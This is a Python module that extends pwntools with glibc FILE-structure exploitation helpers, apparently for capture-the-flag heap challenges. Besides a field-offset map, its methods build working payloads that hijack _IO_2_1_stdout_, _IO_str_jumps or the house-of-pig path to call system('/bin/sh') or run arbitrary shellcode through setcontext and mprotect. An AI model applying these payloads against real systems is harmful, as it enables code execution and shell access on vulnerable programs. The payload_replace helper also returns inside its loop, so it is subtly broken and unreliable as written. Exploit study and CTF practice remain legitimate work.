#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    : io_file.py
@Time    : 2021/11/23 23:46:48
@Author  : Roderick Chan
@Email   : ch22166@163.com
@Desc    : Extension for FileStructure in pwntools and define useful IO_FILE related methods
'''


from pwn import FileStructure, error, context, pack, flat

__all__ = [
    "IO_FILE_plus_struct",
    "payload_replace"
]

class IO_FILE_plus_struct(FileStructure):

    def __init__(self, null=0):
        FileStructure.__init__(self, null)
    
    def __setattr__(self,item,value):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            object.__setattr__(self,item,value)
        else:
            error("Unknown variable %r" % item)

    def __getattr__(self,item):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            return object.__getattribute__(self,item)
        error("Unknown variable %r" % item)
    
    def __str__(self):
        return str(self.__bytes__())[2:-1]

    
    @property
    def _mode(self):
        off = 320
        if context.bits == 64:
            off = 112
        return (self.unknown2 >> off) & 0xffffffff

    @_mode.setter
    def _mode(self, value:int):
        assert value <= 0xffffffff and value >= 0, "value error: {}".format(hex(value))
        off = 320
        if context.bits == 64:
            off = 112
        self.unknown2 |= (value << off)


    @staticmethod
    def show_struct(arch="amd64"):
        if arch not in ("amd64", "i386"):
            error("arch error, noly i386 and amd64 supported!")
        print("arch :", arch)
        _IO_FILE_plus_struct_map = {
            'i386':{
                0x0:'_flags',
                0x4:'_IO_read_ptr',
                0x8:'_IO_read_end',
                0xc:'_IO_read_base',
                0x10:'_IO_write_base',
                0x14:'_IO_write_ptr',
                0x18:'_IO_write_end',
                0x1c:'_IO_buf_base',
                0x20:'_IO_buf_end',
                0x24:'_IO_save_base',
                0x28:'_IO_backup_base',
                0x2c:'_IO_save_end',
                0x30:'_markers',
                0x34:'_chain',
                0x38:'_fileno',
                0x3c:'_flags2',
                0x40:'_old_offset',
                0x44:'_cur_column',
                0x46:'_vtable_offset',
                0x47:'_shortbuf',
                0x48:'_lock',
                0x4c:'_offset',
                0x54:'_codecvt',
                0x58:'_wide_data',
                0x5c:'_freeres_list',
                0x60:'_freeres_buf',
                0x64:'__pad5',
                0x68:'_mode',
                0x6c:'_unused2',
                0x94:'vtable'
            },
            'amd64':{
                0x0:'_flags',
                0x8:'_IO_read_ptr',
                0x10:'_IO_read_end',
                0x18:'_IO_read_base',
                0x20:'_IO_write_base',
                0x28:'_IO_write_ptr',
                0x30:'_IO_write_end',
                0x38:'_IO_buf_base',
                0x40:'_IO_buf_end',
                0x48:'_IO_save_base',
                0x50:'_IO_backup_base',
                0x58:'_IO_save_end',
                0x60:'_markers',
                0x68:'_chain',
                0x70:'_fileno',
                0x74:'_flags2',
                0x78:'_old_offset',
                0x80:'_cur_column',
                0x82:'_vtable_offset',
                0x83:'_shortbuf',
                0x88:'_lock',
                0x90:'_offset',
                0x98:'_codecvt',
                0xa0:'_wide_data',
                0xa8:'_freeres_list',
                0xb0:'_freeres_buf',
                0xb8:'__pad5',
                0xc0:'_mode',
                0xc4:'_unused2',
                0xd8:'vtable'
            }
        }
        for k, v in _IO_FILE_plus_struct_map[arch].items():
            print("  {} : {} ".format(hex(k), v))


    def getshell_from_IO_puts_by_stdout_libc_2_23(self, stdout_store_addr:int, system_addr:int, lock_addr:int):
        """Exec shell by IO_puts by _IO_2_1_stdout_ in libc-2.23.so

        Args:
            stdout_store_addr (int): The address stored in stdout. Probably is libc.sym['_IO_2_1_stdout_'].
            system_addr (int): System address.
            lock_addr (int): Lock address.

        Returns:
            bytes: payload.
        """
        self.flags = 0x68732f6e69622f
        self._IO_read_ptr = 0x61
        self._IO_save_base = system_addr
        self._lock = lock_addr
        self.vtable = stdout_store_addr + 0x10
        return self.__bytes__()


    # only support amd64
    def getshell_by_str_jumps_finish_when_exit(self, _IO_str_jumps_addr:int, system_addr:int, bin_sh_addr:int):
        """Execute system("/bin/sh") through fake IO_FILE struct, and the version of libc should be between 2.24 and 2.29.

        Usually, you have hijacked _IO_list_all, and will call _IO_flush_all_lockp by exit or other function.

        Args:
            _IO_str_jumps_addr (int): Addr of _IO_str_jumps
            system_addr (int): Addr of system
            bin_sh_addr (int): Addr of the string: /bin/sh

        Returns:
            bytes: payload
        """
        assert context.bits == 64, "only support amd64!"
        self.flags &= ~1
        self._IO_read_ptr = 0x61
        self.unknown2 = 0
        self._IO_write_base = 0
        self._IO_write_ptr = 0x1
        self._IO_buf_base = bin_sh_addr
        self.vtable = _IO_str_jumps_addr - 8
        return self.__bytes__() + pack(0, 64) + pack(system_addr, 64)


    def house_of_pig_exec_shellcode(self, fp_heap_addr:int, gadget_addr:int, str_jumps_addr:int, 
                        setcontext_off_addr:int, mprotect_addr:int, shellcode: str or bytes, lock:int=0):
        """House of pig to exec shellcode with setcontext.

        You should fill tcache_perthread_struct[0x400] with '__free_hook - 0x1c0' addr.

        Args:
            fp_heap_addr (int): The heap addr that replace original _IO_list_all or chain
            gadget_addr (int): Gadget addr for 'mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]'
            str_jumps_addr (int): Addr of _IO_str_jumps
            setcontext_off_addr (int): Addr of setcontext and add offset, which is often 61
            mprotect_addr (int): Addr of mprotect
            shellcode ([type]): The shellcode you wanner execute
            lock (int, optional): lock value if needed. Defaults to 0.

        Returns:
            bytes: payload
        """
        assert context.bits == 64, "only support amd64!"
        self.flags = 0xfbad2800
        self._IO_write_base = 0
        self._IO_write_ptr = 0xffffffffffffff
        self.unknown2 = 0
        self._lock = lock
        self.vtable = str_jumps_addr
        self._IO_buf_base = fp_heap_addr + 0x110
        self._IO_buf_end = fp_heap_addr +0x110 + 0x1c8
        payload = flat({
            0:self.__bytes__(),
            0x100:{
                0x8: fp_heap_addr + 0x110,
                0x20: setcontext_off_addr,
                0xa0: fp_heap_addr + 0x210,
                0xa8: mprotect_addr,
                0x70: 0x2000,
                0x68: (fp_heap_addr + 0x110)&~0xfff,
                0x88: 7,
                0x100: fp_heap_addr + 0x310,
                0x1c0: gadget_addr,
                0x200: shellcode
            }
        })
        return payload


def payload_replace(payload: str or bytes, rpdict:dict=None, filler="\x00"):
    assert isinstance(payload, (str, bytes, int)), "wrong payload!"
    assert context.bits in (32, 64), "wrong context.bits!"
    assert len(filler) == 1, "wrong filler!"
    
    output = list(payload) if isinstance(payload, bytes) else list(payload.encode())
    
    if isinstance(filler, str):
        filler = filler.encode()

    for off, data in rpdict.items():
        assert isinstance(off, int), "wrong off in rpdict!"
        assert isinstance(data, (int, bytes, str)), "wrong data: {}!".format(data)

        if isinstance(data, str):
            data = data.encode()
        elif isinstance(data, int):
            data = pack(data, word_size=context.bits, endianness=context.endian)
        distance = len(output) - len(data)
        if off > distance:
            output.extend([int.from_bytes(filler, "little")]*(off - distance))

        for i, d in enumerate(data):
            output[off+i] = d
        return bytes(output)